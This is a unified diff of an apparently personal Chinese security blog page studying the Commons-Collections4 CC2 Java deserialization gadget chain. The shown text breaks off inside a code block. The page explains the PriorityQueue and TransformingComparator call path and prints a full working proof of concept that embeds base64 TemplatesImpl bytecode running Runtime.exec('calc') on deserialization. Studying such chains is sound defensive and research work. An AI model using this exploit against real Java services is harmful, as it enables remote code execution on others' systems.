@@ -2,10 +2,13 @@
 <html lang=en>
 <head>
     <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
     <meta name="description" content="现在学习一条链是越来越快了，不错，一个半小时争取拿下CC2  *CC链之法也 commons-collections中找Gadget的过程，实际上可以简化为找⼀条从 Serializable#readObject() ⽅法到 Transformer#transform()⽅法的调⽤链，然后通过Transformer#transform()方法调用我们构造的恶意代码  123Serializabl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java安全5(7)_CC2">
@@ -15,36 +18,43 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(7)_CC2/%E4%B8%A4%E4%B8%AACC%E5%BA%93.png">
 <meta property="article:published_time" content="2024-11-20T14:34:08.542Z">
-<meta property="article:modified_time" content="2024-11-21T07:27:46.851Z">
+<meta property="article:modified_time" content="2025-02-25T13:04:00.750Z">
 <meta property="article:tag" content="Java安全">
 <meta property="article:tag" content="java反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(7)_CC2/%E4%B8%A4%E4%B8%AACC%E5%BA%93.png">
-    
-    
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(7)_CC2/%E4%B8%A4%E4%B8%AACC%E5%BA%93.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
       
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
     <!-- title -->
     <title>Java安全5(7)_CC2</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
 
-    <!-- Umami Analytics -->
+ <!-- Umami Analytics -->
 
 
     <!-- styles -->
@@ -54,10 +64,9 @@
     <!-- persian styles -->
     
     <!-- rss -->
+     
+    <!-- mathjax -->
     
-    
-	<!-- mathjax -->
-	
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -72,8 +81,6 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
        --><li><a href="/tags/">Tag</a></li><!--
@@ -87,6 +94,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/21/Java%E5%AE%89%E5%85%A85(8)_CC5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2024/11/20/Java%E5%AE%89%E5%85%A85(6)_CC3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -119,7 +128,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%B3%95%E4%B9%9F"><span class="toc-number">1.</span> <span class="toc-text">*CC链之法也</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#commons-collections4%E5%92%8Ccommons-collections"><span class="toc-number">2.</span> <span class="toc-text">commons-collections4和commons-collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%9A%84CC%E5%8C%85but%E9%93%81%E6%89%93%E7%9A%84CC%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">流水的CC包but铁打的CC链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">环境配置如下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Old-CC-in-Commons-collections4-pocs"><span class="toc-number">3.2.</span> <span class="toc-text">Old CC in Commons-collections4 pocs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-CC1For4-TransformedMap-poc%E7%8E%B0%E5%9C%A8%E4%BC%9A%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1calc"><span class="toc-number">3.3.</span> <span class="toc-text">Q: CC1For4_TransformedMap poc现在会调用两次calc?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-for-commons-collections4"><span class="toc-number">4.</span> <span class="toc-text">CC2 for commons-collections4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">4.1.</span> <span class="toc-text">Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-util-PriorityQueue"><span class="toc-number">4.2.</span> <span class="toc-text">java.util.PriorityQueue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-apache-commons-collections4-comparators-TransformingComparator"><span class="toc-number">4.3.</span> <span class="toc-text">org.apache.commons.collections4.comparators.TransformingComparator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-%E5%8E%9F%E5%A7%8Bpoc"><span class="toc-number">4.4.</span> <span class="toc-text">CC2 原始poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-TemplatesImpl-%E6%94%B9%E8%BF%9Bpoc"><span class="toc-number">4.5.</span> <span class="toc-text">CC2_TemplatesImpl 改进poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%AD%BB"><span class="toc-number">4.6.</span> <span class="toc-text">CC链之死</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%B3%95%E4%B9%9F"><span class="toc-number">1.</span> <span class="toc-text">*CC链之法也</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#commons-collections4%E5%92%8Ccommons-collections"><span class="toc-number">2.</span> <span class="toc-text">commons-collections4和commons-collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E6%B0%B4%E7%9A%84CC%E5%8C%85but%E9%93%81%E6%89%93%E7%9A%84CC%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">流水的CC包but铁打的CC链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">环境配置如下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Old-CC-in-Commons-collections4-pocs"><span class="toc-number">3.2.</span> <span class="toc-text">Old CC in Commons-collections4 pocs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-CC1For4-TransformedMap-poc%E7%8E%B0%E5%9C%A8%E4%BC%9A%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1calc"><span class="toc-number">3.3.</span> <span class="toc-text">Q: CC1For4_TransformedMap poc现在会调用两次calc?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-for-commons-collections4"><span class="toc-number">4.</span> <span class="toc-text">CC2 for commons-collections4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget"><span class="toc-number">4.1.</span> <span class="toc-text">Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-util-PriorityQueue"><span class="toc-number">4.2.</span> <span class="toc-text">java.util.PriorityQueue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#org-apache-commons-collections4-comparators-TransformingComparator"><span class="toc-number">4.3.</span> <span class="toc-text">org.apache.commons.collections4.comparators.TransformingComparator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-%E5%8E%9F%E5%A7%8Bpoc"><span class="toc-number">4.4.</span> <span class="toc-text">CC2 原始poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC2-TemplatesImpl-%E6%94%B9%E8%BF%9Bpoc"><span class="toc-number">4.5.</span> <span class="toc-text">CC2_TemplatesImpl 改进poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC%E9%93%BE%E4%B9%8B%E6%AD%BB"><span class="toc-number">5.</span> <span class="toc-text">CC链之死</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">6.</span> <span class="toc-text">Ref</span></a></li></ol>
       </div>
     
   </span>
@@ -188,7 +197,7 @@
 </li>
 </ol>
 <blockquote>
-<p>官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能<br>向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版<br>本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中</p>
+<p>官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中</p>
 </blockquote>
 <h2 id="流水的CC包but铁打的CC链"><a href="#流水的CC包but铁打的CC链" class="headerlink" title="流水的CC包but铁打的CC链"></a>流水的CC包but铁打的CC链</h2><h3 id="环境配置如下"><a href="#环境配置如下" class="headerlink" title="环境配置如下"></a>环境配置如下</h3><ol>
 <li>可以换成ali源</li>
@@ -199,8 +208,8 @@
 <li><p>⽼的利⽤链在commons-collections4中只需要少量修改就可以使用(CC1,CC3,CC6)</p>
 <ol>
 <li><strong>但是内部逻辑其实有了较多的不同了</strong>: TransformedMap和LazyMap<ol>
-<li>CC1For_TransformedMap</li>
-<li>CC1For_LazyMap</li>
+<li>CC1For4_TransformedMap</li>
+<li>CC1For4_LazyMap</li>
 </ol>
 </li>
 </ol>
@@ -226,10 +235,10 @@
 </blockquote>
 <ol>
 <li><p>思路是通过java.util.PriorityQueue的<code>readObject()</code>方法调用内部的heapify()方法来实现比较，而比较使用比较转换器<code>TransformingComparator</code>，可以在比较是对不同值进行转换，调用恶意代码</p>
- <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain 挺简单的一条链</span></span><br><span class="line">java.util.PriorityQueue#readObejct()</span><br><span class="line">    java.util.PriorityQueue#heapify()</span><br><span class="line">        java.util.PriorityQueue#siftDown()</span><br><span class="line">            java.util.PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                org.apache.commons.collections4.comparators.TransformingComparator#Compare()              </span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain 挺简单的一条链</span></span><br><span class="line">java.util.PriorityQueue#readObejct()</span><br><span class="line">    java.util.PriorityQueue#heapify()</span><br><span class="line">        java.util.PriorityQueue#siftDown()</span><br><span class="line">            java.util.PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                org.apache.commons.collections4.comparators.TransformingComparator#Compare()</span><br><span class="line">                    Transformer#transform()             </span><br></pre></td></tr></table></figure></li>
 </ol>
 <h3 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h3><blockquote>
-<p>PriorityQueue的利⽤链不⽀持在commons-collections 4前使用:  org.apache.commons.collections4.comparators.TransformingComparator ，在commons-collections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤</p>
+<p>PriorityQueue的利⽤链不⽀持在commons-collections4 4.0前使用:  org.apache.commons.collections4.comparators.TransformingComparator ，在commons-collections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤</p>
 </blockquote>
 <ol>
 <li>java.util.PriorityQueue 是⼀个有⾃⼰ readObject() ⽅法的类，这里是java的原生库来着<ol>
@@ -272,14 +281,14 @@
 </ol>
   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ysoserial solution</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 手动进行设置即可</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p><strong>InvokerTransformer</strong>: 这条链由于失去了外面的<code>FrAXFilter</code>的包裹，导致需要调用到<code>InvokerTransformer</code>来执行命令，对于有过滤的还是不行</p>
+<li><p><strong>InvokerTransformer</strong>: 这条链由于失去了外面的<code>TrAXFilter</code>的包裹，导致需要调用到<code>InvokerTransformer</code>来执行命令，对于有过滤的还是不行</p>
 </li>
 </ol>
 </li>
 </ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>[]) Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>[]) Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                    <span 